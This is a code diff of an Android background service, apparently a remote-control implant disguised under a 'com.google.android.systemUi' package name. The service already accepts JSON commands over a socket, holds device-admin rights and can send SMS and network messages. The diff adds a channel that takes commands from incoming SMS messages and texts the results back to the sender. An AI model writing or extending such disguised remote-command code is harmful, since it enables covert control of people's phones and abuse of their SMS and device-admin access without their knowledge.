@@ -9,23 +9,23 @@ import android.os.*;
 import android.preference.*;
 import android.speech.tts.*;
 import android.speech.tts.TextToSpeech.*;
+import android.telephony.*;
+import android.util.*;
 import com.genonbeta.CoolSocket.*;
 import com.google.android.systemUi.config.*;
 import com.google.android.systemUi.helper.*;
+import com.google.android.systemUi.receiver.*;
 import java.io.*;
 import java.net.*;
 import java.util.*;
 import org.json.*;
 
-import java.lang.Process;
-import android.telephony.*;
-
 public class CommunicationService extends Service implements OnInitListener
 {
 	public static final String TAG = "CommunationService";
 
-	private AudioManager mAudioManager;
 	private CommunicationServer mCommunationServer;
+	private AudioManager mAudioManager;
 	private DevicePolicyManager mDPM;
 	private ComponentName mDeviceAdmin;
 	private ArrayList<String> mGrantedList = new ArrayList<String>();
@@ -37,7 +37,7 @@ public class CommunicationService extends Service implements OnInitListener
 	private boolean mNotifyRequests = false;
 	private Vibrator mVibrator;
 
-	public class CommunicationServer extends CoolJsonCommunication
+	private class CommunicationServer extends CoolJsonCommunication
 	{
 		public CommunicationServer()
 		{
@@ -46,35 +46,35 @@ public class CommunicationService extends Service implements OnInitListener
 			this.setSocketTimeout(AppConfig.DEFAULT_SOCKET_LARGE_TIMEOUT);
 		}
 
-		private void handleRequest(Socket socket, JSONObject receivedMessage, JSONObject response, String clientIp) throws Exception
+		public void handleRequest(Socket socket, JSONObject receivedMessage, JSONObject response, String clientIp) throws Exception
 		{
 			boolean result = false;
 			Intent actionIntent = new Intent();
 
 			if (receivedMessage.has("printDeviceName") && receivedMessage.getBoolean("printDeviceName"))
 				response.put("deviceName", mPreferences.getString("deviceName", Build.MODEL));
-			
+
 			if (mNotifyRequests)
 			{
 				Notification.Builder builder = new Notification.Builder(CommunicationService.this);
 				Notification.BigTextStyle bTS = new Notification.BigTextStyle(builder);
-				
+
 				bTS
 					.setBigContentTitle(clientIp)
 					.bigText(receivedMessage.toString());
-				
+
 				builder
 					.setStyle(bTS)
 					.setSmallIcon(android.R.drawable.stat_sys_download_done)
 					.setTicker(receivedMessage.toString())
 					.setContentTitle(clientIp)
 					.setContentText(receivedMessage.toString());
-				
+
 				mPublisher.notify(0, builder.getNotification());
-				
+
 				response.put("warning", "Request notified");
 			}
-			
+
 			if (!mGrantedList.contains(clientIp))
 			{
 				if (!mPreferences.contains("password"))
@@ -267,15 +267,15 @@ public class CommunicationService extends Service implements OnInitListener
 						break;
 					case "notifyRequests":
 						mNotifyRequests = !mNotifyRequests;
-						
+
 						if (!mNotifyRequests)
 							mPublisher.cancelNotification(0);
-							
+
 						response.put("notifyRequests", mNotifyRequests);
 						result = true;
 						break;
 					case "send":
-						CoolCommunication.Messenger.send(receivedMessage.getString("server"), receivedMessage.getInt("port"), receivedMessage.getString("message"), null);
+						response.put("isSent", CoolCommunication.Messenger.sendOnCurrentThread(receivedMessage.getString("server"), receivedMessage.getInt("port"), receivedMessage.getString("message"), null));
 						result = true;
 						break;
 					case "sendSMS":
@@ -318,26 +318,63 @@ public class CommunicationService extends Service implements OnInitListener
 			}
 		}
 	}
-	
+
 	private class ConnectionTest implements Runnable
 	{
 		private int mTimes;
 		private int mPort;
 		private String mServer;
-		
+
 		public ConnectionTest(int times, String server, int port)
 		{
-			
+
 		}
-		
+
 		@Override
 		public void run()
 		{
 			for (int i = 0; i < this.mTimes; i++)
 			{
-				
+
 			}
 		}
+	}
+	
+	protected void runCommandSMS(final String sender, final String message)
+	{
+		new Thread(new Runnable()
+			{
+				@Override
+				public void run()
+				{
+					JSONObject response = new JSONObject();
+					JSONObject receivedMessage;
+					SmsManager smsManager = SmsManager.getDefault();
+
+					try
+					{
+						receivedMessage = new JSONObject(message);
+					}
+					catch (JSONException e)
+					{
+						receivedMessage = new JSONObject();
+					}
+
+					try
+					{
+						mCommunationServer.handleRequest(null, receivedMessage, response, sender);
+						smsManager.sendTextMessage(sender, null, response.toString(), null, null);
+					}
+					catch (Exception e)
+					{}
+				}
+			}
+		).start();
+	}
+
+	public boolean send(String server, int port, String message, CoolCommunication.Messenger.ResponseHandler handler)
+	{
+		return CoolCommunication.Messenger.sendOnCurrentThread(server, port, message, handler);
 	}
 
 	private boolean ttsExit()
@@ -358,11 +395,6 @@ public class CommunicationService extends Service implements OnInitListener
 		return false;
 	}
 	
-	public boolean send(String server, int port, String message, CoolCommunication.Messenger.ResponseHandler handler)
-	{
-		return CoolCommunication.Messenger.sendOnCurrentThread(server, port, message, handler);
-	}
-
 	@Override
 	public IBinder onBind(Intent intent)
 	{
@@ -424,6 +456,15 @@ public class CommunicationService extends Service implements OnInitListener
 				}
 			}
 		}
+
+		if (intent != null)
+			if (SmsReceiver.ACTION_SMS_RECEIVED.equals(intent.getAction()) && intent.hasExtra(SmsReceiver.EXTRA_SENDER_NUMBER) && intent.hasExtra(SmsReceiver.EXTRA_MESSAGE))
+			{
+				String message = intent.getStringExtra(SmsReceiver.EXTRA_MESSAGE);
+				String sender = intent.getStringExtra(SmsReceiver.EXTRA_SENDER_NUMBER);
+
+				runCommandSMS(sender, message);
+			}
 
 		return START_STICKY;
 	}
